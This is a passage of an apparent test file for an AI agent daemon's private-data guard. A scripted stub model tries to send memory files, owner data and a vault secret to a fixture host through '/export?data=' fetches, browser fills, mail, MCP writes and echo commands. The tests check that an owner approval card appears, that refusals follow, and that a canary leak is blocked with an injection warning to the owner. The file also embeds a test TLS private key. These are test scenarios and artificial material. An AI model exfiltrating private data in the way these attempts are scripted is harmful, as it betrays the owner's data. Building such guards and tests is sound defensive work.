  mkdirSync(join(dshbotHome, 'secrets'), { recursive: true })
  writeFileSync(join(dshbotHome, 'secrets', 'EXPORT_KEY'), VAULT_VALUE, { mode: 0o600 })
  writeFileSync(join(dshbotHome, 'hosts.json'), JSON.stringify({ fixture: { user: 'test', host: '192.0.2.10', port: 2222 } }))
  writeFileSync(join(dshbotHome, 'mail.json'), JSON.stringify({ primary: {
    host: '127.0.0.1', port: (imap.address() as AddressInfo).port, login: 'owner@example.org',
    password_env: 'MAIL_TEST_PASSWORD', tls: true, smtp: { host: '127.0.0.1', port: 1 },
  } }))
  writeMcpJson({ [SERVER]: stdioEntry(SERVER) })
})

afterEach(async () => {
  for (const d of world.daemons) {
    if (d.exited) continue
    d.child.kill('SIGTERM')
    const timer = setTimeout(() => d.child.kill('SIGKILL'), 8_000)
    await d.exit
    clearTimeout(timer)
  }
  await Promise.all([closeServer(world.tg.server), closeServer(world.stub.server), closeServer(world.fixture)])
  await new Promise<void>((resolve) => world.imap.close(() => resolve()))
})

const TLS_CERT = `
-----BEGIN CERTIFICATE-----
MIIDJzCCAg+gAwIBAgIUFECeD9A3rxPKMEPr+lpxHV5BwQ8wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MCAXDTI2MTAyNDIzMTQwMloYDzIxMjYw
OTMwMjMxNDAyWjAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQCl75vwjHshC+EcrFjUp5qsRpg8pt/dJccfNYBc2BBZ
+0XZOZF3nR9Q686Slo7OHFIiEqk61mfDxlf6xr625k8nPyzTmDPjLaI76abyK274
XT2h1QlrPBkURnJXYePUGK5lagYfHqGzDd8d07WCz2E7RNXalJR7mAVseWpI6Kxf
RiIyZmgJZIgmElMkuTRblD1UtTtCyixL4sIiwArGsiEGRYLlxrM8drVcRr1vMMBS
SEDMxTGuiMCj+eFKxYNcjh9qSVUAXUpD9jcLKJZdnlNL68zEGSsTOpq47LhESnAb
mK1cpzZHspapRjYnQTq1LwhmaKO+KOcwjLq7Qbl5YppVAgMBAAGjbzBtMB0GA1Ud
DgQWBBRUq9OBqqby/LWZ2gHbxL89bVmDzDAfBgNVHSMEGDAWgBRUq9OBqqby/LWZ
2gHbxL89bVmDzDAaBgNVHREEEzARgglsb2NhbGhvc3SHBH8AAAEwDwYDVR0TAQH/
BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAHsN/i6d/2e5JIHv2fi5yi3zw32LL
r77keIQgQtU7jdY7kagOofilpPFAib5f/mhsSVTW4z5gUEojDSJ0WMPLfT4PX115
BWhM9E39BgZ3A9QLGN49N+LZL80C13H5UcO5pUdO1U6FIexc6XuspRDmBmqQSQKF
YwTIP5dlWcYQNO9hZvKa0q9GqkqT5in5EJPom1Qs0++0jdaEcyciFsgdYPS43vhr
yUByXZngY+sVjSe8TEuSBdxaCajkZ8Rpmvx8moZsUMRw3EiJanSxFZA9ezYdX9FK
nUS8feGaR8LXMs2M3SUCkoQwGj8AC2EERgYLku5Lt5NmbhmNPeDMzrKvPw==
-----END CERTIFICATE-----
`.trim() + '\n'

const TLS_KEY = `
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCl75vwjHshC+Ec
rFjUp5qsRpg8pt/dJccfNYBc2BBZ+0XZOZF3nR9Q686Slo7OHFIiEqk61mfDxlf6
xr625k8nPyzTmDPjLaI76abyK274XT2h1QlrPBkURnJXYePUGK5lagYfHqGzDd8d
07WCz2E7RNXalJR7mAVseWpI6KxfRiIyZmgJZIgmElMkuTRblD1UtTtCyixL4sIi
wArGsiEGRYLlxrM8drVcRr1vMMBSSEDMxTGuiMCj+eFKxYNcjh9qSVUAXUpD9jcL
KJZdnlNL68zEGSsTOpq47LhESnAbmK1cpzZHspapRjYnQTq1LwhmaKO+KOcwjLq7
Qbl5YppVAgMBAAECggEAAygffkfsXE6UsLQw8J6IZwkVuXoKd6QtMzLjXKPZ6X9c
Pg0zvmPXrbg64581no+BpvirVu+vWRhMNF4qOCtjkbg8VZnI461pI0Rcd3R2jKWA
TvF1uUTQFbU65w88QIRoEL2lzbBrxxTphcwGf61UZEyLCSaIvoGPGZ4LaKCfMkmI
3E7SU+0QrAj6BXJsBhI9pTaLNwh33B0sD2jZHezUfV9wxBBMi3P0Jw+ejTPwtsoK
ji8p2oc0ROxgvZJ2Ls3u9TBV+CIADWiLvrURDSQiJIq1rd75o7DM10IxkA8+QVV9
9VSg9TSXy45SGqCvUdVQRyeZw+hmA7yf2qhgNIXJaQKBgQDRHj4H3j5HpFAbV8K/
7+elNkZplakfwWCrPfpPXqMcQUDgeXGWoaH9lb4XUttyAXLYR+XzcIX2c3Lpd5PX
2P7ambvFeHdZ+HGxpqTu3cjjimmR1tcMylH/skY4jXWoZtfz4kqDH9CDOb0OdmbB
z1IoNJmU9DXfJPAcvY+0CXMu+wKBgQDLIwvFvgmZCwMXXnY4ot0rXbHnbjnHfRir
ZTiwI+Y9Fi/621hUrpjNhySQyGruhTlViwfzIm+Hu84P93UHsUGfu2b0hD9i39IJ
XnsjeidxTIx4kEZYU1HSahenZhjsviv5kXQvceoVcFpUulAM3Xr6YYKGRo/cvc5z
O9qd+wja7wKBgBgem9r+eEJ9Ijw1ICJRQm+c1fxBpdMi08qMiH11Fe0hXaFGgKJ2
HCAKkHVSOjtpDV0C1fQBK4JkiIGDKEtCHQsLpku9fE6lSD/MT8O5Uv1jro+CryUr
hM+wOUc2kbaNviTEGgILvloUY8jyQSHjjr9SadBzZm9JbGR0PMnwORfXAoGAXYOi
tcOIc5XoNGfeELCZFI+riJjrrHRgWPbeI+hC47hFGjzD6yf9XBBsuuIop+lYvZKl
dD5UDa5dbGhEzefCCCCjgskmzQOwk3OVSH3Bjpzoxc/VMnAY6L7CaOPNcZ8Sa2+U
hwrv8jKowvyKQYHsTTt6dQoizEHsuovBVpzsNK0CgYAPhJhV7M9eOkRG6PypeOiT
DBh5SYSR5EHyCo+UWx3eUXTrxQkHogE3ye4CNuiUlxq1TuMyG5mDAiVcT8N4mG7c
nUXQfd3+E/0k313hUdn67G5m+gB+JnJnaR6kEfxrIrq/Q8Oz2pyjyKiNYvDlW14B
/BL3u/Q6elKR9wrRIdWgDg==
-----END PRIVATE KEY-----
`.trim() + '\n'

/** Minimal TLS IMAP peer, using the certificate and wire format of mail-imap-daemon.test.ts. */
async function startImapFixture(): Promise<TlsServer> {
  const server = createTlsServer({ cert: TLS_CERT, key: TLS_KEY }, (socket) => {
    socket.on('error', () => undefined)
    socket.write('* OK fixture ready\r\n')
    let buffer = ''
    socket.on('data', (chunk: Buffer) => {
      buffer += chunk.toString('utf8')
      for (;;) {
        const end = buffer.indexOf('\r\n')
        if (end < 0) break
        const line = buffer.slice(0, end)
        buffer = buffer.slice(end + 2)
        const [tag, ...words] = line.split(' ')
        const command = words.join(' ')
        if (/^SELECT /i.test(command)) {
          socket.write('* 1 EXISTS\r\n* OK [UIDVALIDITY 7777777] valid\r\n')
        } else if (/^UID SEARCH /i.test(command)) {
          socket.write('* SEARCH 42\r\n')
        } else if (/^UID FETCH /i.test(command)) {
          const letter = Buffer.from(`From: reader@example.org\r\nSubject: ${BODY}\r\nDate: Sun, 25 Oct 2026 10:00:00 +0000\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n${BODY}\r\n`)
          socket.write(`* 1 FETCH (UID 42 BODY[] {${letter.length}}\r\n`)
          socket.write(letter)
          socket.write(')\r\n')
        } else if (/^LOGOUT/i.test(command)) {
          socket.end(`* BYE closing\r\n${tag} OK done\r\n`)
          continue
        }
        socket.write(`${tag} OK done\r\n`)
      }
    })
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  return server
}

const fixtureUrl = (path: string, host = HOST_A): string => `http://${host}:${world.fixturePort}${path}`
const sshCalls = (): string => existsSync(world.sshLog) ? readFileSync(world.sshLog, 'utf8') : ''
const newCards = (mark: number): Card[] => cardsIn({ events: world.timeline.events.filter((e) => e.n > mark), seq: world.timeline.seq }, OWNER_CHAT)

function resultAt(marker: string, actionIndex: number): Block {
  const request = turnCalls(marker)[actionIndex + 1]
  expect(request, `the model received the result of step ${actionIndex} in ${marker}`).toBeDefined()
  const results = lastResults((request as DsEvent).body)
  expect(results, 'one actual tool result reached the model').toHaveLength(1)
  return results[0] as Block
}

function expectRefusal(result: Block): void {
  expect(result.isError || /отказ|не выполн|не вызван|недоступ|запрещ|закрыт|подтвержд|владел|denied|refus|blocked|approval/i.test(result.text), result.text).toBe(true)
  expect(result.text).not.toContain(BODY)
  expect(result.text.trim(), 'the refusal explains why the operation did not run').not.toBe('')
}

/** Finish or card are both terminal observations: a missing card fails immediately on the old implementation. */
async function pendingCard(d: Daemon, marker: string, mark: number): Promise<Card> {
  await waitFor('approval card or completed turn', () => newCards(mark).length > 0 || replyEvent(OWNER_CHAT, marker) !== undefined, d)
  expect(newCards(mark), `the outgoing operation needs an owner card in ${marker}`).toHaveLength(1)
  await sleep(250)
  return newCards(mark)[0] as Card
}

async function finish(d: Daemon, marker: string): Promise<void> {
  await waitFor('the final owner answer', () => replyEvent(OWNER_CHAT, marker) !== undefined, d)
}

async function ready(): Promise<Daemon> {
  const daemon = await startOwnerDaemon()
  await waitServersUp(daemon, [SERVER])
  return daemon
}

type Source = 'web_search' | 'web_fetch' | 'browser' | 'mail-list' | 'mail-read' | 'mcp'

function sourceActions(source: Source): Action[] {
  switch (source) {
    case 'web_search': return [call('web_search', { query: 'ordinary public facts' })]
    case 'web_fetch': return [call('web_fetch', { url: fixtureUrl('/source') })]
    case 'browser': return [search('browser'), call('browser', { action: 'open', url: fixtureUrl('/source') })]
    case 'mail-list': return [search('mail'), call('mail', { action: 'list', box: 'primary' })]
    case 'mail-read': return [search('mail'), call('mail', { action: 'read', box: 'primary', uid: 42 })]
    case 'mcp': return [search(ECHO), call(ECHO, { text: BODY })]
  }
}

const sources: Source[] = ['web_search', 'web_fetch', 'browser', 'mail-list', 'mail-read', 'mcp']

for (const source of sources) {
  test.skipIf(source === 'browser' && chromium === undefined)(`test_c1_${source}_does_not_gate_a_later_web_fetch`, { timeout: TEST_TIMEOUT_MS }, async () => {
    const marker = 'turn-external-1'
    const prefix = sourceActions(source)
    world.stub.scripts.set(marker, [...prefix, call('web_fetch', { url: fixtureUrl('/outgoing', HOST_B) })])
    const d = await ready()
    const mark = world.timeline.seq
    await ownerTurn(d, marker)
    const external = resultAt(marker, prefix.length - 1)
    expect(external.isError, external.text).toBe(false)
    expect(external.text, 'external content really reached the model first').toContain(BODY)
    const fetched = resultAt(marker, prefix.length)
    expect(fetched.isError, fetched.text).toBe(false)
    expect(fetched.text, 'the later fetch ran and returned its page').toContain(BODY)
    expect(world.hits.some((hit) => hit.includes('/outgoing')), 'the fetch reached the fixture').toBe(true)
    expect(newCards(mark), 'external content draws no card for an ordinary fetch').toEqual([])
  })
}

test.skipIf(chromium === undefined)('test_c3_browser_new_public_host_after_external_content_needs_no_card', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-browser-1'
  world.stub.scripts.set(marker, [search('browser'),
    call('browser', { action: 'open', url: fixtureUrl('/first') }),
    call('browser', { action: 'open', url: fixtureUrl('/same-host') }),
    call('browser', { action: 'open', url: fixtureUrl('/new-host', HOST_B) }),
  ])
  const d = await ready()
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  expect(resultAt(marker, 1).text).toContain(BODY)
  expect(resultAt(marker, 2).text).toContain(BODY)
  expect(resultAt(marker, 3).isError, resultAt(marker, 3).text).toBe(false)
  expect(resultAt(marker, 3).text).toContain(BODY)
  expect(world.hits.some((hit) => hit.includes('/same-host'))).toBe(true)
  expect(world.hits.some((hit) => hit.includes('/new-host'))).toBe(true)
  expect(newCards(mark), 'a new public host draws no card').toEqual([])
})

for (const target of [WRITE, FALSE_READONLY, 'host_exec']) {
  test(`test_c2_${target}_after_an_mcp_read_runs_without_a_card`, { timeout: TEST_TIMEOUT_MS }, async () => {
    const marker = 'turn-write-1'
    const action = target === 'host_exec'
      ? call(target, { host: 'fixture', command: 'echo HOST-CONTROL' })
      : call(target, { text: 'PUBLIC-WRITE-CONTROL' })
    world.stub.scripts.set(marker, [search(ECHO), search(target), call(ECHO, { text: BODY }), action])
    const d = await ready()
    const mark = world.timeline.seq
    await ownerTurn(d, marker)
    expect(resultAt(marker, 2).text).toContain(BODY)
    expect(resultAt(marker, 3).isError, resultAt(marker, 3).text).toBe(false)
    expect(resultAt(marker, 3).text).toContain(target === 'host_exec' ? 'HOST-EXEC-OK' : 'DONE:')
    if (target === 'host_exec') expect(sshCalls()).toContain('HOST-CONTROL')
    else expect(calledNames(SERVER)).toEqual(['echo', target === WRITE ? 'write' : 'explicit_write'])
    expect(newCards(mark), 'an ordinary call after an MCP read draws no card').toEqual([])
  })
}

function sandboxWorks(): boolean {
  const directory = mkdtempSync(join(tmpdir(), 'dshbot-outbound-probe-'))
  try {
    const profile = sandboxProfile({ home: directory, workspace: directory, roPaths: [] })
    const probe = spawnSync(profile[0] as string, [...profile.slice(1), '/bin/true'], { timeout: 10_000 })
    return probe.error === undefined && probe.status === 0 && spawnSync('curl', ['--version']).status === 0
  } finally {
    rmSync(directory, { recursive: true, force: true })
  }
}

const sandboxAvailable = sandboxWorks()
const networkCommand = (path: string): string => `curl -sS --max-time 5 '${fixtureUrl(path)}'`

test.skipIf(!sandboxAvailable)('test_c4_exec_keeps_its_network_after_external_content', { timeout: TEST_TIMEOUT_MS }, async () => {
  const d = await ready()
  world.stub.scripts.set('turn-network-1', [call('exec', { command: networkCommand('/clean-exec'), timeout_sec: 20 })])
  await ownerTurn(d, 'turn-network-1')
  expect(resultAt('turn-network-1', 0).text, 'control: the real sandbox proxy can reach the fixture').toContain(BODY)
  const marker = 'turn-network-2'
  world.stub.scripts.set(marker, [...sourceActions('web_fetch'),
    call('exec', { command: 'echo LOCAL-EXEC-STILL-WORKS', timeout_sec: 20 }),
    call('exec', { command: networkCommand('/after-external'), timeout_sec: 20 }),
  ])
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  expect(resultAt(marker, 1).text).toContain('LOCAL-EXEC-STILL-WORKS')
  expect(resultAt(marker, 2).text, 'the request of exec reaches the fixture through the proxy').toContain(BODY)
  expect(resultAt(marker, 2).text).not.toMatch(/сеть закрыта после внешнего контента/i)
  expect(world.hits.some((hit) => hit.includes('/after-external'))).toBe(true)
  expect(newCards(mark), 'the network never asks for an owner card').toEqual([])
})

test('test_c4_turns_keep_fetch_browser_mcp_and_host_exec_available', { timeout: TEST_TIMEOUT_MS }, async () => {
  const d = await ready()
  const mark = world.timeline.seq
  const actions = [
    call('web_fetch', { url: fixtureUrl('/clean-fetch') }),
    call('browser', { action: 'open', url: fixtureUrl('/clean-browser') }),
    call(WRITE, { text: 'ORDINARY-PUBLIC-TEXT' }),
    call(FALSE_READONLY, { text: 'ANOTHER-PUBLIC-TEXT' }),
    call('host_exec', { host: 'fixture', command: 'echo CLEAN-HOST' }),
  ]
  for (const [index, action] of actions.entries()) {
    if (action.kind === 'tool' && action.name === 'browser' && chromium === undefined) continue
    const marker = `turn-clean-${index + 1}`
    world.stub.scripts.set(marker, [search(`${action.kind === 'tool' ? action.name : ''}`), action])
    await ownerTurn(d, marker)
    const result = resultAt(marker, 1)
    expect(result.isError, result.text).toBe(false)
    expect(result.text).toMatch(/EXTERNAL-FIXTURE-OK|DONE:|HOST-EXEC-OK/)
    if (action.kind === 'tool' && action.name === 'browser') {
      const ref = result.text.match(/\b(g\d+e\d+)\b/)?.[1]
      expect(ref, 'a real input ref is available for clean fill').toBeDefined()
      world.stub.scripts.set('turn-cleanfill-1', [search('browser'), call('browser', { action: 'fill', ref, text: 'ORDINARY-PUBLIC-INPUT' })])
      await ownerTurn(d, 'turn-cleanfill-1')
      expect(resultAt('turn-cleanfill-1', 1).isError).toBe(false)
    }
  }
  expect(newCards(mark), 'ordinary tools have no new confirmations').toEqual([])
  expect(calledNames(SERVER)).toEqual(['write', 'explicit_write'])
  expect(sshCalls()).toContain('CLEAN-HOST')
})

test('test_c2_readOnlyHint_mcp_calls_need_no_card', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-readonly-1'
  world.stub.scripts.set(marker, [search(ECHO), call(ECHO, { text: BODY }), call(ECHO, { text: 'SECOND-READ' })])
  const d = await ready()
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  expect(calledNames(SERVER)).toEqual(['echo', 'echo'])
  expect(resultAt(marker, 2).text).toContain('SECOND-READ')
  expect(newCards(mark)).toEqual([])
})

type Outgoing = 'fetch' | 'browser-url' | 'browser-fill' | 'mcp' | 'mail' | 'exec' | 'host_exec'
const outgoingKinds: Outgoing[] = ['fetch', 'browser-url', 'browser-fill', 'mcp', 'mail', 'exec', 'host_exec']
// The exec tools (host_exec over SSH included) quote the private files in their arguments without
// a card (#148): a quote check never sees a leak by substitution, while a vault value in it still counts.
const localExecKinds = new Set<Outgoing>(['exec', 'host_exec'])

function outgoing(kind: Outgoing, value: string): Action {
  switch (kind) {
    case 'fetch': return call('web_fetch', { url: fixtureUrl(`/export?data=${encodeURIComponent(value)}`) })
    case 'browser-url': return call('browser', { action: 'open', url: fixtureUrl(`/export?data=${encodeURIComponent(value)}`) })
    case 'browser-fill': return call('browser', { action: 'fill', ref: 'e1', text: value })
    case 'mcp': return call(WRITE, { text: value })
    case 'mail': return call('mail', { action: 'send', box: 'primary', to: ['reader@example.org'], subject: 'Ordinary subject', text: value })
    case 'exec': return call('exec', { command: `echo '${value}'`, timeout_sec: 20 })
    case 'host_exec': return call('host_exec', { host: 'fixture', command: `echo '${value}'` })
  }
}

const privateSources: Array<{ value: string; source: RegExp; vault?: boolean }> = [
  { value: PRIVATE_MEMORY, source: /MEMORY\.md|долговременн.*памят/i },
  { value: PRIVATE_USER, source: /USER\.md|профил.*владельц|данн.*владельц/i },
  { value: PRIVATE_IDENTITY, source: /identity|личност|идентичност/i },
  { value: PRIVATE_KNOWLEDGE, source: /knowledge|private-topic|знан/i },
  { value: VAULT_VALUE, source: /EXPORT_KEY|секрет|secret/i, vault: true },
]

for (const [sourceIndex, entry] of privateSources.entries()) {
  test(`test_c5_private_source_${sourceIndex}_in_outgoing_arguments_needs_a_card_naming_its_origin`, { timeout: TEST_TIMEOUT_MS }, async () => {
    const d = await ready()
    const kinds = entry.vault === true ? outgoingKinds : outgoingKinds.filter((kind) => !localExecKinds.has(kind))
    for (const [index, kind] of kinds.entries()) {
      if (kind === 'browser-fill' && chromium === undefined) continue
      const marker = `turn-fragment-${index + 1}`
      const action = outgoing(kind, entry.value)
      // A real snapshot/ref is needed for fill. Its preparation belongs to a previous turn,
      // so the card here comes from the private-data rule alone.
      if (kind === 'browser-fill') {
        world.stub.scripts.set('turn-prepare-1', [search('browser'), call('browser', { action: 'open', url: fixtureUrl('/form') })])
        await ownerTurn(d, 'turn-prepare-1')
        const ref = resultAt('turn-prepare-1', 1).text.match(/\b(g\d+e\d+)\b/)?.[1]
        expect(ref, 'the real browser handed out an input ref').toBeDefined()
        if (action.kind === 'tool') action.input.ref = ref
      }
      world.stub.scripts.set(marker, [search(kind === 'mcp' ? WRITE : kind.startsWith('browser') ? 'browser' : kind === 'fetch' ? 'web_fetch' : kind), action])
      const mark = world.timeline.seq
      const callsBefore = callsOf(SERVER).length
      const sshBefore = sshCalls()
      const hitsBefore = world.hits.filter((hit) => hit.includes('/export?data=')).length
      say(OWNER_CHAT, `${marker} ordinary request`)
      const card = await pendingCard(d, marker, mark)
      expect(card.text, `the ${kind} card identifies the private source`).toMatch(entry.source)
      expect(callsOf(SERVER)).toHaveLength(callsBefore)
      expect(sshCalls()).toBe(sshBefore)
      expect(world.hits.filter((hit) => hit.includes('/export?data='))).toHaveLength(hitsBefore)
      world.tg.push(buttonPress(OWNER_CHAT, card.messageId, card.deny))
      await finish(d, marker)
      expectRefusal(resultAt(marker, 1))
      expect(callsOf(SERVER)).toHaveLength(callsBefore)
      expect(sshCalls()).toBe(sshBefore)
      expect(world.hits.filter((hit) => hit.includes('/export?data='))).toHaveLength(hitsBefore)
    }
  })
}

for (const mode of ['external', 'memory'] as const) {
  test(`test_c6_autonomous_goal_${mode}_outgoing_call_follows_only_the_private_data_rule`, { timeout: TEST_TIMEOUT_MS }, async () => {
    const marker = 'turn-autonomous-1'
    const prefix = mode === 'external' ? sourceActions('web_fetch') : []
    world.stub.scripts.set(marker, [...prefix, call('web_fetch', { url: fixtureUrl(mode === 'memory' ? `/blocked?data=${PRIVATE_MEMORY}` : '/after-external', HOST_B) })])
    const d = await ready()
    const mark = world.timeline.seq
    say(OWNER_CHAT, `/goal ${marker} inspect then fetch once`)
    await waitFor('the autonomous model receives the outgoing-call result', () => turnCalls(marker).length >= prefix.length + 2, d)
    if (prefix.length > 0) expect(resultAt(marker, 0).text).toContain(BODY)
    if (mode === 'memory') {
      expectRefusal(resultAt(marker, prefix.length))
      expect(world.hits.some((hit) => hit.includes('/blocked'))).toBe(false)
    } else {
      const fetched = resultAt(marker, prefix.length)
      expect(fetched.isError, fetched.text).toBe(false)
      expect(fetched.text).toContain(BODY)
      expect(world.hits.some((hit) => hit.includes('/after-external'))).toBe(true)
    }
    expect(newCards(mark)).toEqual([])
  })
}

// Without an owner the private-data rule refuses every outgoing destination at once:
// no card, no request, no MCP write, and the reason names the missing owner.
test('test_c5_autonomous_goal_memory_quote_in_fetch_browser_mail_and_mcp_is_refused_without_a_card', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-autonomous-2'
  const kinds: Outgoing[] = ['fetch', 'browser-url', 'mail', 'mcp']
  const searchFor = (kind: Outgoing): string => kind === 'mcp' ? WRITE : kind === 'fetch' ? 'web_fetch' : kind.startsWith('browser') ? 'browser' : kind
  world.stub.scripts.set(marker, kinds.flatMap((kind) => [search(searchFor(kind)), outgoing(kind, PRIVATE_MEMORY)]))
  const d = await ready()
  const mark = world.timeline.seq
  const callsBefore = callsOf(SERVER).length
  say(OWNER_CHAT, `/goal ${marker} export once`)
  await waitFor('the autonomous model receives every outgoing-call result', () => turnCalls(marker).length >= kinds.length * 2 + 1, d)
  for (const [index, kind] of kinds.entries()) {
    const refusal = resultAt(marker, index * 2 + 1)
    expectRefusal(refusal)
    expect(refusal.text, `the ${kind} refusal comes from the private-data rule`).toMatch(/нет владельца/)
    expect(refusal.text).toMatch(/MEMORY\.md|долговременн.*памят/i)
  }
  expect(world.hits.filter((hit) => hit.includes('/export?data='))).toEqual([])
  expect(callsOf(SERVER)).toHaveLength(callsBefore)
  expect(newCards(mark)).toEqual([])
})

/** The whole snapshot carries the canary regardless of its spelling, delimiter or encoding. */
function memorySnapshot(body: JsonObject): string {
  const texts = messagesOf(body).map((message) => flatten(message.content)).join('\n')
  const snapshot = [...texts.matchAll(/<context\b[^>]*>([\s\S]*?)<\/context>/g)].map((match) => match[1]).join('\n')
  expect(snapshot, 'the initial request contains the host memory snapshot').toContain(PRIVATE_MEMORY)
  return snapshot
}

test('test_c7_host_adds_a_random_canary_to_memory_and_leaking_it_is_denied_without_approval_and_warns_owner', { timeout: TEST_TIMEOUT_MS }, async () => {
  const d = await ready()
  await ownerTurn(d, 'turn-snapshot-1')
  const first = memorySnapshot((turnCalls('turn-snapshot-1')[0] as DsEvent).body)
  await commandUntil(d, '/new', (text) => /нов|new|сесси/i.test(text))
  await ownerTurn(d, 'turn-snapshot-2')
  const second = memorySnapshot((turnCalls('turn-snapshot-2')[0] as DsEvent).body)
  expect(second, 'identical memory files get a fresh random canary in a new snapshot').not.toBe(first)
  await commandUntil(d, '/new', (text) => /нов|new|сесси/i.test(text))
  const marker = 'turn-canary-1'
  let snapshot = ''
  world.stub.dynamic = (turn, step, body) => {
    if (turn !== marker) return undefined
    if (step === 0) {
      snapshot = memorySnapshot(body)
      return search(WRITE)
    }
    if (step === 1) return call(WRITE, { text: `ordinary-prefix ${snapshot} ordinary-suffix` })
    return undefined
  }
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  expect(snapshot, 'the attempted leak includes this turn’s snapshot and its canary').toContain(PRIVATE_MEMORY)
  expect(callsOf(SERVER), 'even owner confirmation cannot release a canary').toEqual([])
  expectRefusal(resultAt(marker, 1))
  expect(newCards(mark), 'there is no allow button for a canary').toEqual([])
  await waitFor('the owner injection warning', () => /инъекц|inject|заражен|заражён|вредонос|подмен.*инструкц/i.test(textsSince(OWNER_CHAT, mark).join('\n')), d)
  const warning = textsSince(OWNER_CHAT, mark).join('\n')
  expect(warning, 'the owner gets an injection warning naming the attempted tool').toMatch(/инъекц|inject|заражен|заражён|вредонос|подмен.*инструкц/i)
  expect(warning).toMatch(/(?:mcp__testsrv__)?write/)
})

test('test_c8_memory_fragments_in_owner_answers_and_message_tool_are_delivered_without_approval_after_external_content', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-ownerchat-1'
  const text = privateSources.slice(0, 4).map((entry) => entry.value).join('\n')
  world.stub.scripts.set(marker, [search(ECHO), search('message'), call(ECHO, { text: BODY }),
    call('message', { action: 'send', text: `MESSAGE-CONTROL\n${text}` }),
    { kind: 'text', text: `fin ${marker}\nANSWER-CONTROL\n${text}` },
  ])
  let snapshot = ''
  world.stub.dynamic = (turn, step, body) => {
    if (turn !== marker) return undefined
    if (step === 0) snapshot = memorySnapshot(body)
    if (step === 3) return call('message', { action: 'send', text: `MESSAGE-CONTROL\n${text}\n${snapshot}` })
    if (step === 4) return { kind: 'text', text: `fin ${marker}\nANSWER-CONTROL\n${text}\n${snapshot}` }
    return undefined
  }
  const d = await ready()
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  const delivered = textsSince(OWNER_CHAT, mark)
  for (const entry of privateSources.slice(0, 4)) {
    expect(delivered.some((message) => message.includes('MESSAGE-CONTROL') && message.includes(entry.value)), JSON.stringify(delivered)).toBe(true)
    expect(delivered.some((message) => message.includes('ANSWER-CONTROL') && message.includes(entry.value))).toBe(true)
  }
  expect(resultAt(marker, 2).text, 'the turn really consumed outside content').toContain(BODY)
  expect(newCards(mark)).toEqual([])
})

test.skipIf(!sandboxAvailable)('test_c4_clean_exec_network_runs_without_new_approval', { timeout: TEST_TIMEOUT_MS }, async () => {
  const d = await ready()
  const marker = 'turn-cleanexec-1'
  world.stub.scripts.set(marker, [call('exec', { command: networkCommand('/clean-network'), timeout_sec: 20 })])
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  expect(resultAt(marker, 0).text).toContain(BODY)
  expect(world.hits.some((hit) => hit.includes('/clean-network'))).toBe(true)
  expect(newCards(mark)).toEqual([])
})

test('test_c5_owner_allow_releases_a_memory_fragment_to_mcp_once', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-memoryallow-1'
  world.stub.scripts.set(marker, [search(WRITE), call(WRITE, { text: `prefix ${PRIVATE_MEMORY} suffix` })])
  const d = await ready()
  const mark = world.timeline.seq
  say(OWNER_CHAT, `${marker} export`)
  const card = await pendingCard(d, marker, mark)
  expect(card.text).toMatch(/MEMORY\.md|долговременн.*памят/i)
  expect(callsOf(SERVER)).toEqual([])
  world.tg.push(buttonPress(OWNER_CHAT, card.messageId, card.allow))
  await finish(d, marker)
  expect(callsOf(SERVER)).toEqual([{ name: 'write', arguments: { text: `prefix ${PRIVATE_MEMORY} suffix` } }])
  expect(resultAt(marker, 1).text).toContain('DONE:write')
})

test('test_c1_no_owner_click_expires_the_private_data_card_and_returns_a_refusal_without_fetching', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-expire-1'
  world.stub.scripts.set(marker, [search('web_fetch'), call('web_fetch', { url: fixtureUrl(`/expired?data=${encodeURIComponent(PRIVATE_MEMORY)}`, HOST_B) })])
  const d = await ready()
  const mark = world.timeline.seq
  say(OWNER_CHAT, `${marker} export a memory fragment`)
  await pendingCard(d, marker, mark)
  expect(world.hits.some((hit) => hit.includes('/expired'))).toBe(false)
  // No callback is sent. Move only the daemon's Date past the normal approval deadline.
  writeFileSync(join(world.dataDir, 'clock-offset'), String(APPROVAL_TTL_MS + 1_000))
  await finish(d, marker)
  expectRefusal(resultAt(marker, 1))
  expect(world.hits.some((hit) => hit.includes('/expired'))).toBe(false)
})

test('test_c1_a_second_fetch_runs_without_a_card', { timeout: TEST_TIMEOUT_MS }, async () => {
  const marker = 'turn-samefetch-1'
  world.stub.scripts.set(marker, [call('web_fetch', { url: fixtureUrl('/first-fetch') }), call('web_fetch', { url: fixtureUrl('/second-fetch') })])
  const d = await ready()
  const mark = world.timeline.seq
  await ownerTurn(d, marker)
  expect(resultAt(marker, 1).text).toContain(BODY)
  expect(world.hits.some((hit) => hit.includes('/first-fetch'))).toBe(true)
  expect(world.hits.some((hit) => hit.includes('/second-fetch'))).toBe(true)
  expect(newCards(mark), 'a repeated fetch draws no card').toEqual([])
})
